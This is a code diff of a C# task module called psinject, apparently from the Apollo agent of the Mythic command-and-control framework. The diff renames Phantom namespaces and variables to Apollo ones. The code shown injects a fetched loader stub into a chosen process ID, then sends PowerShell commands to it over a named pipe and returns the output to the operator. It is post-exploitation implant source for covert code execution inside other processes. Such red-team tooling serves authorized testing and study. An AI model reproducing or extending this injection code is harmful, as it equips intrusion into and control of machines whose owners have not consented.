@@ -9,16 +9,16 @@
 using System;
 using System.Linq;
 using System.Text;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using PhantomInterop.Serializers;
+using ApolloInterop.Serializers;
 using System.Threading;
 using System.Collections.Concurrent;
 using System.IO.Pipes;
-using PhantomInterop.Structs.PhantomStructs;
-using PhantomInterop.Classes.Collections;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Classes.Collections;
 
 namespace Tasks
 {
@@ -37,44 +37,44 @@ namespace Tasks
             public string PowerShellParameters;
         }
 
-        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
-        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
-        private JsonHandler _serializer = new JsonHandler();
-        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
-        private Action<object> _transmitAction;
+        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
+        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private JsonSerializer _serializer = new JsonSerializer();
+        private AutoResetEvent _complete = new AutoResetEvent(false);
+        private Action<object> _sendAction;
 
-        private Action<object> _flushData;
+        private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
-        private bool _isFinished = false;
+        private bool _completed = false;
         public psinject(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
-            _transmitAction = (object p) =>
+            _sendAction = (object p) =>
             {
                 PipeStream ps = (PipeStream)p;
-                while (ps.IsConnected && !_stopToken.IsCancellationRequested)
+                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
                     {
-                    _msgSendEvent,
-                    _stopToken.Token.WaitHandle
+                    _senderEvent,
+                    _cancellationToken.Token.WaitHandle
                     });
-                    if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
+                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                     {
-                        ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
+                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                     }
                 }
-                _taskComplete.Set();
+                _complete.Set();
             };
 
-            _flushData = (object p) =>
+            _flushMessages = (object p) =>
             {
                 string output = "";
-                while (!_stopToken.IsCancellationRequested && !_isFinished)
+                while (!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
                     {
-                        _taskComplete,
-                        _stopToken.Token.WaitHandle
+                        _complete,
+                        _cancellationToken.Token.WaitHandle
                     }, 1000);
                     output = string.Join("", _assemblyOutput.Flush());
                     if (!string.IsNullOrEmpty(output))
@@ -103,7 +103,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                PowerShellInjectParameters parameters = _dataSerializer.Deserialize<PowerShellInjectParameters>(_data.Parameters);
+                PowerShellInjectParameters parameters = _jsonSerializer.Deserialize<PowerShellInjectParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PowerShellParameters) ||
                     string.IsNullOrEmpty(parameters.PipeName))
@@ -128,7 +128,7 @@ namespace Tasks
 
                     if (pidRunning)
                     {
-                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId,
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
                             var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
@@ -138,7 +138,7 @@ namespace Tasks
                                     "",
                                     false,
                                     "",
-                                    new ICommandMessage[]
+                                    new IMythicMessage[]
                                     {
                                         Artifact.ProcessInject(parameters.PID,
                                             _agent.GetInjectionManager().GetCurrentTechnique().Name)
@@ -157,20 +157,20 @@ namespace Tasks
                                     StringData = cmd
                                 };
                                 AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                client.ConnectionEstablished += OnConnectionReady;
+                                client.ConnectionEstablished += Client_ConnectionEstablished;
                                 client.MessageReceived += Client_MessageReceived;
-                                client.Disconnect += OnConnectionClosed;
+                                client.Disconnect += Client_Disconnect;
                                 if (client.Connect(3000))
                                 {
-                                    DataChunk[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                    foreach (DataChunk chunk in chunks)
+                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                                    foreach (IPCChunkedData chunk in chunks)
                                     {
-                                        _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                                     }
 
-                                    _msgSendEvent.Set();
-                                    _taskComplete.WaitOne();
-                                    _isFinished = true;
+                                    _senderEvent.Set();
+                                    _complete.WaitOne();
+                                    _completed = true;
                                     resp = CreateTaskResponse("", true, "completed");
                                 }
                                 else
@@ -208,31 +208,31 @@ namespace Tasks
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
-        private void OnConnectionClosed(object sender, PipeMessageData e)
+        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
         {
             e.Pipe.Close();
-            _stopToken.Cancel();
-            _taskComplete.Set();
+            _cancellationToken.Cancel();
+            _complete.Set();
         }
 
-        private void OnConnectionReady(object sender, PipeMessageData e)
+        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
-            System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
-            System.Threading.Tasks.Task.Factory.StartNew(_flushData, _stopToken.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
+            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
         }
 
-        public void ProcessSentMessage(IAsyncResult result)
+        public void OnAsyncMessageSent(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
-            
-            if (pipe.IsConnected && !_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] data))
+            // Potentially delete this since theoretically the sender Task does everything
+            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
             {
                 pipe.EndWrite(result);
-                pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
+                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
             }
         }
 
-        private void Client_MessageReceived(object sender, PipeMessageData e)
+        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
         {
             IPCData d = e.Data;
             string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
